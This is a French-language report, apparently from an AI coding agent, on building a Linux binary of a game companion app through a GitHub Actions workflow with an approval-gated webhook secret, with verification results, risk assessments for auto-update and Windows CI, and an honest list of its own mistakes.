### Le bouton d'envoi est ACTIF — la preuve qui se voit

`interface_hub.py:2282` : `possible = bool(WEBHOOK_RAPPORTS and jeu_valide(self.jeu))`. Le
bouton n'est doré que si **les deux** sont vrais. J'ai donc posé un faux dossier de jeu
(`/tmp/faux_jeu` avec `Interface` et `Data`, ce qu'exige `racine_jeu()`) — **vide**, donc sans
un seul texte à récolter.

| | vue Contribuer |
|---|---|
| binaire **diagnostic** (sans webhook) | bouton **gris** (`btn_envoyer_gris`) |
| binaire **distribution** (avec webhook) | bouton **doré et actif** — « Envoyer mon rapport » |

C'est la preuve **comportementale**, et elle est plus forte que la textuelle : elle dit que le
webhook est vivant **dans le programme qui tourne**, pas seulement présent dans ses octets.

### Aucun rapport n'a été envoyé sur le Discord des joueurs

Quatre barrières, dont trois suffiraient :

1. **`--demo`** court-circuite le `self.after(2500, self.envoi_auto_au_lancement)` — c'est la
   branche `if demo:` de `Hub.__init__`, l'envoi automatique n'est jamais programmé ;
2. **`envoi_auto: False`** écrit dans la config posée pour l'essai ;
3. **le faux dossier de jeu est vide** : `construire_rapport()` n'y trouverait rien ;
4. **personne n'a cliqué** sur le bouton — les runs sont automatisés, la fenêtre est fermée au
   bout de 12 secondes.

### Le récapitulatif de la construction, avec le secret

| | |
|---|---|
| binaire | **37,2 Mo** (39 013 392 octets), `a149bdf2…9625065` |
| construit sur | Ubuntu 22.04.5 LTS, **glibc 2.35**, Python 3.12.13 |
| les 5 vues | ✅ **aucune sortie d'erreur**, captures de 341 à 426 Ko |
| assets | ✅ `decor_hub.json`, `catalogue_hub.json`, `MORPHEUS.TTF`, `FRIZQT__.TTF`, `fond.png` |
| polices du jeu | ❌ toujours pas chargées (API Windows) — inchangé, et sans rapport avec le secret |

---

## ✅ BLOC D — les deux questions, sans une ligne de code

### 1. La mise à jour automatique sous Linux

**Ce qu'il faut :** le relais actuel écrit un `.bat` temporaire
(`compagnon.py:682`, `tempfile.mkstemp(suffix=".bat")`) qui attend la fin du processus, fait
`move` sur l'exe, `start` le nouveau, `del` le script. Trois choses le rendent inutilisable
sous Linux :

- `move`, `start`, `del` et `cmd.exe` n'existent pas ;
- `creationflags=0x08000000` (`CREATE_NO_WINDOW`, l. 757) fait **lever une `ValueError`** par
  `subprocess` sur POSIX — ce n'est pas ignoré, ça casse ;
- tout le calcul de chemins passe par `%APPDATA%` / `%LOCALAPPDATA%`, absents.

Il faudrait un équivalent `.sh` : attendre la sortie du processus, `mv`, `chmod +x`, relancer,
`rm`. **Environ 30 lignes**, plus un aiguillage `sys.platform` à chaque endroit concerné.

**Où ça touche : `compagnon.py`, l'un des 5 fichiers surveillés.** Donc chaque modification
repasse par `synchroniser_depot_public.py`, la déclaration de secret, et
`verifier_arbre_publie.py`. C'est lourd, et c'est tant mieux.

**Ce qui peut mal tourner — et pourquoi je serais très prudent :**

1. **C'est le code le plus dangereux du projet.** Le programme 8 a montré qu'un relais raté
   laisse le joueur **sans aucune application installée** : l'ancien exe est déjà déplacé quand
   le nouveau échoue. Sous Linux le risque est identique, et **on n'a aucun joueur Linux pour
   nous le signaler** — on découvrirait la panne par un silence.
2. **Le fondement du relais Windows ne se transpose pas.** Il repose sur un fait vérifié au
   programme 9 : *renommer un exe en cours d'exécution est permis sous Windows*. Sous Linux
   c'est **encore plus permissif** (on peut écraser un binaire en cours via `mv` sur le même
   système de fichiers, l'inode reste vivant) — mais `mv` **entre systèmes de fichiers** fait
   une copie + suppression, et là on retombe sur `ETXTBSY`. Le `/tmp` d'une machine Linux est
   très souvent un système de fichiers séparé. **Ce détail décide de tout, et il faut le
   mesurer avant d'écrire une ligne.**
3. **Le bit d'exécution.** Un binaire téléchargé arrive sans `+x`. Un relais qui oublie
   `chmod` laisse un fichier inerte et un joueur sans rien.
4. **Il n'y a pas « un » Linux.** Le relais Windows suppose un seul emplacement d'installation ;
   sous Linux le binaire peut être n'importe où, y compris dans un dossier où l'utilisateur n'a
   pas le droit d'écrire.

**Mon avis :** à faire, mais **après** avoir des joueurs Linux qui utilisent le binaire, et avec
un banc qui éprouve les deux cas de `mv` (même système de fichiers et non). Livrer d'abord un
binaire qu'on télécharge à la main est un état stable ; livrer un auto-remplacement mal éprouvé
ne l'est pas.

### 2. La construction Windows sur GitHub — ce que j'en pense vraiment

**Ce que ça demanderait**, techniquement : peu de chose. Un job `runs-on: windows-latest`, le
même `.spec` (qui, lui, marche tel quel), le même secret, le même environnement. Une journée.

**Ce que ça coûte en risque — et c'est là que je ne suis pas neutre :**

Aujourd'hui, l'exe qui part sur 274 machines est construit sur une machine que Dan contrôle
entièrement, avec un secret qui n'existe que sur ce disque. Demain, il serait construit par un
workflow que **n'importe quel commit fusionné peut modifier**, avec un secret que GitHub détient.

Le glissement est réel, mais **il n'est pas dans le sens qu'on croit**. Ce qui change vraiment :

- **le secret passe du disque de Dan à GitHub.** Ce n'est pas un affaiblissement en soi —
  GitHub le chiffre et le masque — mais ça **déplace la confiance** vers un tiers, et ça la
  rend récupérable par quiconque obtient le compte GitHub de Dan. Aujourd'hui, prendre son
  compte GitHub ne donne pas le webhook ; demain si ;
- **la surface d'attaque devient le fichier de workflow**, c'est-à-dire du texte dans une PR —
  bien plus facile à glisser qu'un accès à un PC.

**Ce que je ferais :** oui, mais **pas avant que ① l'environnement à approbation soit en place**
(bloc 0). Avec lui, le pire scénario devient : un workflow malveillant est fusionné, quelqu'un
le déclenche, **Dan voit un écran d'approbation qu'il n'attendait pas** — et refuse. Sans lui,
le même scénario est silencieux.

Et je nuancerais l'objectif : « publier ne dépend plus de mon PC » est un gain réel de
**continuité** (Dan malade, PC en panne, disque mort). Ce n'est pas un gain de **sécurité** —
c'est un échange : moins de dépendance à une machine, plus de dépendance à une chaîne
d'approbation qu'il faut tenir. L'échange me paraît bon, **à condition que la chaîne
d'approbation existe avant**.

🛑 **Rien codé pour ces deux points**, comme demandé.

---

## 🛑 Terminé — l'état exact

| « Terminé » veut dire | état |
|---|---|
| l'état réel des protections, et ce que Dan doit cocher | ✅ constaté par l'API ; **les 3 réglages faits et re-vérifiés** |
| où vit `.github/workflows/` et pourquoi | ✅ **dépôt public uniquement** — précédent mesuré, code de synchro relu |
| un workflow qui construit le Hub Linux, lancé à la main, sur une branche | ✅ sur `linux-build`, **5 runs**, 2 défauts trouvés et corrigés |
| le binaire téléchargé et lancé : 5 vues, polices, taille, distribution | ✅ **5/5 vues**, 37,2 Mo, Ubuntu 22.04.5 / glibc 2.35 — **et les polices du jeu NE se chargent PAS** |
| **le run de distribution s'arrête et attend l'approbation** | ✅ **deux fois**, et elle ne se mémorise pas |
| **le binaire porte le webhook, sans jamais l'afficher** | ✅ prouvé **deux fois** — dans le run et sur ma machine, empreintes identiques (`570ea4e48214e733`) |
| **le journal COMPLET d'un run avec secret, relu** | ✅ **784 lignes, 100 427 caractères**, 0 fuite ; les 6 masques `***` identifiés un par un |
| **la barrière vue mordre** | ✅ run `30742954624` — échec à l'étape 5, **tout le reste sauté** |
| **la capture du bouton d'envoi actif** | ✅ doré au lieu de gris, avec faux dossier de jeu vide |
| aucun rapport envoyé sur le Discord des joueurs | ✅ **aucun** — 4 barrières indépendantes |
| les réponses sur la mise à jour Linux et la construction Windows | ✅ les deux, sans une ligne de code |

**Contrôles de fin :**

```
origin/main                  5b2d86c   ← inchangé depuis le programme 17
diff main <-> linux-build  : .github/workflows/construire-hub-linux.yml   (1 seul fichier)
les 5 fichiers surveillés  : identiques, les cinq
tags sur le distant        : 33        ← aucun ajouté
dernière release           : v3.4.1, 2026-08-01T20:07:54Z   ← aucune ajoutée aujourd'hui
```

🛑 **Aucun tag, aucune release, aucune pré-version. Aucun des 5 fichiers surveillés touché.
Rien n'est fusionné dans `main`.** Le binaire vit en **artefact de run**, dans l'onglet
Actions, et expire dans 7 jours : **aucun Compagnon installé ne peut le voir.**

### 👉 Ce qu'il reste à décider — et là je ne tranche pas

- **retirer l'échafaudage** (`on: push: branches: [linux-build]`) **avant toute fusion** ;
- **les polices.** Le Hub Linux est fonctionnel mais il n'a pas le visage du jeu. Le correctif
  est petit (poser les TTF dans `~/.local/share/fonts` et appeler `fc-cache`, ou charger la
  police via Tk plutôt que par GDI) — mais il touche `interface_hub.py`, l'un des 5 fichiers
  surveillés. **C'est un programme à part**, et il faut décider si un Hub en serif est
  acceptable pour une première distribution Linux. Mon avis : oui, il l'est. Ça marche, c'est
  lisible, et c'est infiniment mieux que rien ;
- **annoncer la limite glibc** : rien avant Ubuntu 22.04 / Debian 12.

### Ce qui a résisté

- **Le dispositif d'approbation a fait exactement ce qu'on lui demandait**, deux fois, et sans
  se mémoriser. C'est rare qu'un réglage de sécurité tienne sa promesse au premier essai.
- **Le mode `--demo` du Hub** : 5 lancements réels d'un binaire **qui porte le webhook**, sur un
  coureur public, et **aucun envoi possible**. La branche `if demo:` de `Hub.__init__` est ce
  qui a rendu cet essai sûr.
- **Les garde-fous du dépôt privé** n'ont pas bronché : `verifier_arbre_publie` vert après les
  cinq runs, `balayer_secrets` a lu le workflow et n'y a rien trouvé.
- **`permissions: contents: read`** était déjà le réglage par défaut du dépôt — rien à corriger.

### Ce que j'ai failli casser, et ce que j'ai eu faux

1. **J'ai failli livrer un binaire mort en annonçant un succès.** Le premier run était **vert**,
   le binaire existait, sa taille était bonne — et il plantait au premier décor
   (`PIL._tkinter_finder`). Seul le lancement sur écran virtuel l'a montré.
2. **🛑 J'ai failli conclure que l'injection du secret avait échoué, alors qu'elle était
   parfaite.** Mon contrôle cherchait le secret **en clair** dans le binaire : 0 occurrence,
   run en échec. La faute était dans le contrôle, pas dans ce qu'il contrôlait — PyInstaller
   compresse le bytecode. **C'est la deuxième fois dans ce programme qu'un rouge est faux et
   qu'un vert est creux** ; les deux se sont vus en regardant, pas en raisonnant.
3. **Mon marqueur de commit s'est piégé lui-même.** Le message expliquant les marqueurs
   contenait le marqueur rival ; le run est parti en approbation au lieu de tester la barrière.
   Défaut de mon échafaudage — et une bonne raison de plus qu'il ne survive pas à la fusion.
4. **Je n'avais pas prévu que `workflow_dispatch` exige la branche par défaut.** Découvert en
   le heurtant. Le contournement est sûr par construction, mais **un échafaudage qu'on oublie
   devient une porte**.
5. **J'ai supposé que le `.spec` servirait.** Inutilisable sous Linux sur trois points. Traduit
   en options plutôt que dupliqué en second `.spec`.
6. **Sur les polices, j'ai eu la bonne réponse pour la mauvaise raison d'abord.** J'ai cherché
   si les TTF étaient embarquées — elles le sont. Le défaut est que `charger_polices()` appelle
   une API Windows et que son `except Exception` **avale l'échec en silence**.

### Et une correction à ce que je t'ai dit au programme 17

J'avais écrit que le webhook baké dans l'exe « n'est pas secret » parce qu'« un PyInstaller se
déballe ». **C'est vrai mais je l'ai fait paraître trop facile.** Le secret n'est pas dans le
binaire en clair : il faut extraire l'archive PYZ, la décompresser et lire du bytecode. Un
robot qui balaie les dépôts publics ne trouve **rien**. La règle ne change pas d'un iota —
jamais dans le dépôt — mais **la non-indexation qu'on protège est une protection plus solide
que je ne te l'ai décrite.**
